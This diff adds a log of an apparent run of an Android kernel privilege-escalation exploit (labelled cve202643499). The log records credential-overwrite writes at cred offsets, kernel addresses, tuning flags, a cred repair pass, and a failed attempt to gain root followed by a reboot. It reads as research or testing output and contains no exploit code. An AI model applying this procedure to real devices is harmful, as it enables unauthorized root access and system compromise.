@@ -1,0 +1,87 @@
+[06:06:08] === preflight ===
+* daemon not running; starting now at tcp:5037
+* daemon started successfully
+5.10.236-android12-9-o-gaf2075ad2c06
+Permissive
+0ad9b0c2-7817-483a-a611-bb8b0a37b1ba
+ 06:06:14 up  1:01,  0 users,  load average: 3.27, 3.45, 4.08
+3.27 3.45 4.08 1/8449 14657
+[06:06:15]   clearing leftover glx* from previous runs:
+    remaining: 0
+./exploit_guard: 1 file pushed, 0 skipped. 35.3 MB/s (73008 bytes in 0.002s)
+./exploit_guard: 1 file pushed, 0 skipped. 24.9 MB/s (73008 bytes in 0.003s)
+[06:06:18] === step 1: SELinux Permissive ===
+[06:06:20]   already Permissive — skipping W1 entirely
+[06:06:20] === step 2: host-side kernel log (dmesg poll, deduped by timestamp) ===
+[06:06:22]   /dev/kmsg NOT readable (expected here) — polling dmesg from the host
+[06:06:30]   klog lines after 5s: 2000
+[06:06:30] === step 3: load settle (max 15s, threshold 16) ===
+[06:06:32]   load1=3.48
+[06:06:34] === step 4: LT child (pure userspace spin, NO_EXEC) ===
+[06:06:58]   task=0xffffff8951a13780 child_pid=18089 lt_parent=14687
+[06:07:00]   baseline: Uid: 2000 2000 2000 2000
+[06:07:00] === step 5: 0x778 shot(s) (real_cred) ===
+[06:07:02]   [w778r1] ONE shot: off=0x778 chainwait=6000ms hold=20s nodrain=0 
+[06:07:41]   [w778r1] shot wall-clock: 37s
+    W7[W7] write value = private cred page 0xffffff88679bade0 (+0 shape comp)
+    W7[W7] side effect will land at cred_page+8 — run the LOCAL repair pass afterwards (V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1)
+    W7[W7] write_value = 0xffffff88679bade0
+    W7[W7] write_target= 0xffffff8951a13ef8
+    probe_state    = R
+    probe_done     = 0
+    ✗ W7[W7] miss (probe_state=R)
+    W7[W7] PIN child 24656 holds the payload page 20s; writer returns now
+[06:07:47]   [w778r1] probe_state=R  (D=landed, R=miss, S=blocked)
+[06:08:15]   [w778] round 1/1: readback unchanged
+[06:08:16]   after 0x778: [Uid: 2000 2000 2000 2000]   (recorded as data; the gate is 0x780 + repair)
+[06:08:17] === step 6: 0x780 shot(s) (cred) ===
+[06:08:18]   [w780r1] ONE shot: off=0x780 chainwait=6000ms hold=20s nodrain=0 
+[06:08:58]   [w780r1] shot wall-clock: 39s
+    W7[W7] write value = private cred page 0xffffff8785d6ade0 (+0 shape comp)
+    W7[W7] side effect will land at cred_page+8 — run the LOCAL repair pass afterwards (V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1)
+    W7[W7] write_value = 0xffffff8785d6ade0
+    W7[W7] write_target= 0xffffff8951a13f00
+    probe_state    = D
+    probe_done     = 1
+    ✗ W7[W7] miss (probe_state=D)
+    W7[W7] PIN child 30873 holds the payload page 20s; writer returns now
+[06:09:03]   [w780r1] probe_state=D  (D=landed, R=miss, S=blocked)
+[06:09:05]   [w780] probe_state=D on round 1 — the write landed
+[06:09:06]   after 0x780: [Uid: 2000 2000 2000 2000]
+[06:09:08] === step 7: ONE local repair of cred+8 (cred=0x0xffffff8785d6ade0) ===
+[06:09:58]   after repair: [Uid: 2000 2000 2000 2000]
+[06:09:58] === verdict ===
+[06:10:03]   /proc/18089/status Uid: [Uid: 2000 2000 2000 2000]
+[06:10:04]   child's own report:     []
+[06:10:04]   ✗ cred did not take in this boot.  Take a fresh boot; do not add rounds.
+[06:10:05] === step 8: poke LT parent ===
+error: closed
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+adb.exe: device '91f71075' not found
+[06:11:15] === step 9: watch 15s ===
+[06:11:29]   t+5s up=42 services=3/5
+[06:11:43]   t+10s up=54 services=5/5
+[06:12:01]   t+15s up=70 services=5/5
+[06:12:01] === step 10: evidence ===
+[06:12:05]   klog.host: 3888 lines, 3888 unique
+[06:12:06]   --- reboot / watchdog markers (NOT ROOTCHECK) ---
+[06:12:09]   --- guard markers ---
+[06:12:10]     (none)
+reboot
+Enforcing
+ 06:12:11 up 1 min,  0 users,  load average: 30.45, 11.79, 4.27
+0
+[06:12:13] evidence -> D:/Desktop/cve202643499/out/run9_060605
+[06:12:14] === done ===
